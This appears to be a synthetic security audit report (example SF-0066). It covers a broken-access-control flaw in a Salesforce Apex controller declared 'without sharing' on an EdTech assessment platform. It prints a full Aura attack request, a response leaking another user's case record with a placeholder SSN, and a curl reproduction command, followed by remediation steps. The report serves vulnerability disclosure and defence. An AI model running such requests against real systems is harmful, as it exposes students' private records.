# Security Analysis Report
**System:** LearnPath Assessment Platform (Salesforce-Integrated)
**Domain:** Education / EdTech LMS
**Example ID:** SF-0066
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.1 | Functional pivot on `CaseController.getCaseDetails` — attacker reads any LMS Case record via unauthorized read of case data |

---

## Finding 1 — BAC: Functional Pivot on Case Object (Pattern 2.1)

### Summary
The Apex controller `CaseController` on LearnPath Assessment Platform (`f0895361.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Case object. Per §5.0 Pattern 2.1, the functional pivot allows an attacker to access the `getCaseDetails` action to retrieve Case records belonging to other users. In an EdTech/LMS context, Case records may contain student support tickets, assessment disputes, and student PII.

**Pattern:** 2.1 — Functional pivot, vertical/horizontal (BAC)
**Affected controller:** `c.CaseController.getCaseDetails`
**Affected endpoint:** `POST https://f0895361.lightning.force.com/aura`
**Note:** Apex method name and Aura descriptor both use `getCaseDetails` — consistent within context.txt.

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://f0895361.lightning.force.com/aura
Authorization: Bearer 00DF0895361!ARf0895361...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DF0895361!ARf0895361...

message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN",
"params":{"caseId":"0015361","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Case Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0015361", "Name": "Victim Case Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-43-5346"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DF0895361!ARf0895361..."
curl -s -X POST "https://f0895361.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"0015361","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-43-5346
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CaseController { ... }`
2. `WHERE Id = :caseId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
